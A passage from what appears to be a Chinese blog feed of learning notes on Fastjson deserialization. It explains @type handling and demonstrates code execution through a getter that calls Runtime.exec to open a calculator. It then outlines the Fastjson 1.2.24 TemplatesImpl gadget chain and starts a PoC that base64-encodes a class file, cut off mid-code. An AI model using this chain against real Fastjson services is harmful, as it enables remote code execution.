<p>Fastjson 中文 Wiki：<a class="link"   href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" >https://github.com/alibaba/fastjson/wiki/Quick-Start-CN<i class="fas fa-external-link-alt"></i></a></p>
<p>提供两个主要接口来分别实现序列化和反序列化操作。</p>
<p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p>
<p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p>
<p>能够把json理解成字符串</p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>简单看一下是怎么序列化反序列化的</p>
<p>先导入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2.24&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>先写一个human类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">human</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">human</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>写一个humanSerialize</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">human</span> <span class="variable">human</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">human</span>();</span><br><span class="line">        human.setName(<span class="string">&quot;Flow&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(human, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下个断点看这个过程</p>
<p>会先到JSON这个类，然后<code>toJSONString()</code>-&gt;<code>new SerializeWriter()</code>，序列化在这里完成的，里面定义了一些初值，赋值给 out 变量，这个 out 变量后续作为 <code>JSONSerializer</code> 类构造的参数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419174523.png" ></p>
<p>JSON里面有很多个static变量，其中就有一个<code>DEFAULT_TYPE_KEY</code>值为<code>@type</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419174737.png" ></p>
<p>然后后面就是toString了，看一下运行结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;human&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Flow&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>代码重点在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(human, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure>

<p>主要是第二个参数，<code>SerializerFeature.WriteClassName</code>是 <code>JSON.toJSONString()</code> 里一个设置属性值，设置之后可以在后面序列化数据多加一个@type，也就是写上被序列化的类名，type可以指定反序列化的类，并调用<code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> 方法。</p>
<blockquote>
<p>Fastjson 接受的 JSON 可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p>
</blockquote>
<p>没有设置<code>SerializerFeature.WriteClassName</code>是输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Flow&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:0,\&quot;name\&quot;:\&quot;Flow\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">human</span> <span class="variable">human</span> <span class="operator">=</span> JSON.parseObject(jsonString, human.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(human);</span><br><span class="line">        System.out.println(human.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果就这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">human@6659c656</span><br><span class="line">human</span><br></pre></td></tr></table></figure>

<p>大概就是这么用</p>
<h3 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h3><h4 id="反序列化时的-Feature-SupportNonPublicField-参数"><a href="#反序列化时的-Feature-SupportNonPublicField-参数" class="headerlink" title="反序列化时的 Feature.SupportNonPublicField 参数"></a>反序列化时的 Feature.SupportNonPublicField 参数</h4><p>前面示例中反序列化的时候没办法获取到age的值，因为他是private的，如果要还原出private属性的话，需要在<code>JSON.parseObject</code>&#x2F;<code>JSON.parse</code>中加上<strong>Feature.SupportNonPublicField</strong>参数</p>
<p>现在把human类里面的setAge函数注释掉，此时name是public，age是private，做一个对比</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===没有Feature.SupportNonPublicField===</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">human@6659c656</span><br><span class="line">getName</span><br><span class="line">Flow</span><br><span class="line">getAge</span><br><span class="line">0</span><br><span class="line">====有Feature.SupportNonPublicField====</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">human@6659c656</span><br><span class="line">getName</span><br><span class="line">Flow</span><br><span class="line">getAge</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>所以总的来说，把json传到JSON.parseObject()进行反序列化，如果要内容里面的私有变量被成功地还原出来，要加上<strong>Feature.SupportNonPublicField</strong>参数</p>
<h4 id="只进行-JSON-parseObject-jsonString"><a href="#只进行-JSON-parseObject-jsonString" class="headerlink" title="只进行 JSON.parseObject(jsonString)"></a>只进行 JSON.parseObject(jsonString)</h4><p>看一下parseObject()的指定或不指定对反序列化类型之间的差异</p>
<p>修改human类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">human</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">human</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在的反序列化代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:20,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Flow\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Flow&quot;,&quot;age&quot;:0&#125;</span><br><span class="line">class com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure>

<p>可以看到调用了构造函数，public属性变量的setter函数，所有变量的getter函数，getProperties还被调用了两次，最后得到的obj是JSONObject类型，这算反序列化失败了</p>
<p>现在把语句改成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString,human.class);</span><br></pre></td></tr></table></figure>

<p>输出变成，这样就算成功了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">human@2cdf8d8a</span><br><span class="line">class human</span><br></pre></td></tr></table></figure>

<p>我问ai为什么，它说</p>
<blockquote>
<p>是的，将代码改为 <code>Object obj = JSON.parseObject(jsonString, human.class);</code> 后，Fastjson 能够成功将 JSON 反序列化为 <code>human</code> 类的对象。以下是具体原因和机制分析：</p>
<p><strong>1. 显式指定目标类的作用</strong></p>
<p>通过 <code>JSON.parseObject(jsonString, human.class)</code> <strong>明确告知 Fastjson 目标类</strong>，此时 Fastjson 的行为会发生变化：</p>
<ul>
<li><strong>绕过 <code>@type</code> 的自动解析</strong>：即使 JSON 中包含 <code>@type</code> 字段，Fastjson 也会优先使用你传入的 <code>human.class</code> 作为目标类。</li>
<li><strong>直接实例化 <code>human</code> 对象</strong>：Fastjson 会通过反射创建 <code>human</code> 类的实例，并尝试将 JSON 字段映射到该类的字段或 setter 方法。</li>
</ul>
<p><strong>2. 原代码失败的原因</strong></p>
<p>原代码 <code>JSON.parseObject(jsonString)</code> 未指定目标类，Fastjson 会尝试根据 JSON 中的 <code>@type</code> 字段动态加载类：</p>
<ul>
<li><strong>依赖 <code>@type</code> 的类加载机制</strong>：<code>@type</code> 字段的值 <code>human</code> 需要对应一个全限定类名（如 <code>com.example.human</code>），且该类必须在类路径中可访问。</li>
<li>原代码的问题：<ul>
<li>如果 <code>human</code> 类未正确定义或未被正确加载，Fastjson 无法找到该类，会回退到通用 <code>JSONObject</code>。</li>
<li>即使 <code>human</code> 类存在，某些 Fastjson 版本默认禁用 <code>@type</code> 功能（出于安全考虑），导致动态类加载失败。</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h4><p>两者主要的区别就是<code>parseObject()</code>返回的是JSONObject而<code>parse()</code>返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用<code>JSON.parseObject()</code>来获取数据。</p>
<blockquote>
<p>FastJson中的 <code>parse()</code> 和 <code>parseObject()</code> 方法都可以用来将JSON字符串反序列化成Java对象，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但是 <code>parseObject()</code> 会额外的将Java对象转为 JSONObject对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse()</code> 会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，而 <code>parseObject()</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p>
</blockquote>
<p>所以使用parse()的时候他会自动反序列化得到特定的类，不用想parseObject()一样指定第二个参数，看看效果</p>
<p>现在的代码是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:20,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Flow\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">human@2cdf8d8a</span><br><span class="line">class human</span><br></pre></td></tr></table></figure>

<p>所以就是要用 <code>parseObject</code>，里面的参数需要是 <code>Object.class</code></p>
<h3 id="Fastjson反序列化原理"><a href="#Fastjson反序列化原理" class="headerlink" title="Fastjson反序列化原理"></a>Fastjson反序列化原理</h3><blockquote>
<p>fastjson 在反序列化的时候会去找我们在 <code>@type</code> 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。</p>
</blockquote>
<p>fastjson会对下列要求的setter和getter方法进行调用</p>
<p>满足条件的setter：</p>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
</ul>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>通过fastjson反序列化漏洞，攻击者可以传入恶意构造的json内容，程序对他反序列化后得到恶意类执行力恶意类中的恶意函数，从而导致代码执行</p>
<p>fastjson用parse()&#x2F;parseObject()反序列化的时候可以指定类型，如果刚好指定的类型有很多子类，有很多子函数，就比较有利用空间。</p>
<blockquote>
<p>例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p>
</blockquote>
<h4 id="如何触发恶意函数？"><a href="#如何触发恶意函数？" class="headerlink" title="如何触发恶意函数？"></a>如何触发恶意函数？</h4><p>某种情况下，反序列化后会把反序列化得到的类中的<strong>构造函数，getter，setter都执行一遍</strong>，如果这三个里面存在恶意函数，这就是反序列化漏洞所在！所以触发方式就在这三个里面</p>
<p>所以利用反序列化漏洞的关键：</p>
<ul>
<li>某个类的构造函数、<code>setter</code>方法、<code>getter</code>方法中的某一个存在危险操作，比如造成命令执行；</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
</ul>
<h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><p>如果反序列化指定的类型的是Object.class，也就是代码是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p>反序列化得到的类的构造函数、所有属性的<code>setter</code>方法、properties私有属性的<code>getter</code>方法都会被调用</p>
<p>现在做个尝试，改一下human.java里面的getter函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再执行代码就跳出计算机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:20,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Flow\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString,Object.class,Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当前反序列化里面指定的类是Object.class，他是所有类的父类，所以他的子类的human的getter函数存在恶意函数，当@type指向human类是反序列化就会触发漏洞</p>
<p>如果你知道这个类本事就有问题，直接指定类名也是可以的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString,human.class,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>

<p>看代码触发语句就是</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419195740.png" ></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80" >https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Fastjson-1.2.24漏洞学习笔记</title>
    <url>/2025/04/19/Java-Fastjson-1-2-24%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>jdk8u65</li>
</ul>
<ul>
<li>1.2.22 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.24</li>
</ul>
<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="基于-TemplatesImpl-的利用链"><a href="#基于-TemplatesImpl-的利用链" class="headerlink" title="基于 TemplatesImpl 的利用链"></a>基于 TemplatesImpl 的利用链</h3><p>之前cc3就遇到这个TemplatesImpl的利用，就是字节码的加载，当时针对这个的链子是这样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line"> 	-&gt;TemplatesImpl#newTransformer()</span><br><span class="line">		-&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">			-&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">				-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>刚好这个<code>getOutputProperties()</code>就是一个getter方法，之前CB1链子也提到过。再针对fastjson反序列化的特性，反序列化得到类之后会自动执行该类的构造函数，getter方法，setter方法，所以现在我们就控制要反序列化的对象是&#96;&#96;TemplatesImpl&#96;类就好</p>
<p>再看一次能被利用的getter和setter的要求</p>
<p>满足条件的setter：</p>
<ul>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>非静态方法</li>
<li>无参数</li>
<li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li>
</ul>
<p>其实TemplatesImpl类也有别的getter函数会被调用，但是getOutputProperties()目前最符合我们的要求，它的返回值是Properties类型也继承自Map类</p>
<p>现在尝试写poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span 